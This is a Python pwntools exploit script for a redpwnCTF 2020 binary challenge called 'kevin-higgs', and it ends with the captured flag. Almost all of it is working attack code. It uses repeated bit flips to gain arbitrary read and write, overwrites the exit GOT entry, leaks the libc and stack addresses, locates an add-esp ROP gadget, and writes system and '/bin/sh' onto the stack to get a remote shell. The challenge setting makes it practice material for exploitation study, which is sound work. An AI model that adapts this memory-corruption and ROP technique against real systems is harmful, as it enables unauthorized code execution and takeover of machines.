from pwn import *


def flipbit(address, bit):
    p.recvuntil('uint32): ')
    p.sendline(hex(address + bit // 8)[2:])
    p.recvuntil('7): ')
    p.sendline(str(bit % 8))
    _ = p.recvuntil(['Give me', 'Well, at least you tried.'])
    if b'[debug]' in _:
        i = _.find(b'new byte: ') + 10
        return int(_[i:i + 4], 16)
    return None


def readbyte(address):
    flipbit(address, 0)
    rbyte = flipbit(address, 0)
    assert (rbyte != None)
    return rbyte


def readword(address):
    word = 0
    for i in range(4):
        word |= (readbyte(address + i) << 8 * i)
    return word


def write(what, where):
    was = readword(where)
    for i in range(32):
        if (was ^ what) & (1 << i):
            flipbit(where, i)


binary = ELF('kevin-higgs')
debug = 0x804c090
os.environ['NUMBER_OF_FLIPS'] = '2'
HOST = "2020.redpwnc.tf"
PORT = 31956
libc = ELF('libc6-i386_2.28-10_amd64.so')
p = remote(HOST, PORT)

# revolving exit
flipbit(binary.got['exit'], 1)
flipbit(binary.got['exit'], 9)

# debug mode
flipbit(debug, 0)
flipbit(debug, 1)

# get setvbuf plt address, and base libc:
setvbuf = readword(binary.got['setvbuf'])
log.info('setvbuf --> %s' % hex(setvbuf))
baselibc = setvbuf - libc.symbols['setvbuf']
log.info('baselibc --> %s' % hex(baselibc))
libc.address = baselibc

# leak stack
environ = libc.symbols['environ']
log.info('environ --> %s' % hex(environ))
stackleak = readword(environ)
log.info('stackleak --> %s' % hex(stackleak))

# free rides condition change
maxflips = stackleak - 0xd8
log.info('maxflips --> %s' % hex(maxflips))
flipbit(maxflips, 31)

# esp offset
esp = maxflips - 0xec
log.info('esp --> %s' % hex(esp))

# find add_esp gadget
offset = 20
while True:
    try:
        add_esp = next(libc.search(asm('add esp, ' + hex(offset) + '; ret;')))
        log.info('add_esp --> %s' % hex(add_esp))
        log.info("offset --> %s" % hex(offset))
        break
    except:
        offset += 4
        continue

log.info('updating exit got')
write(add_esp, binary.got['exit'])
log.info('adding system to stack')
write(libc.symbols['system'], esp + (offset - 20))
log.info('adding /bin/sh to stack')
write(next(libc.search(b'/bin/sh\x00')), esp + (offset - 20) + 8)

# one way exit
log.info('"exit" loop to shell')
flipbit(maxflips, 31)

p.interactive()

# FLAG --> flag{kmh_<3333333333333334444}
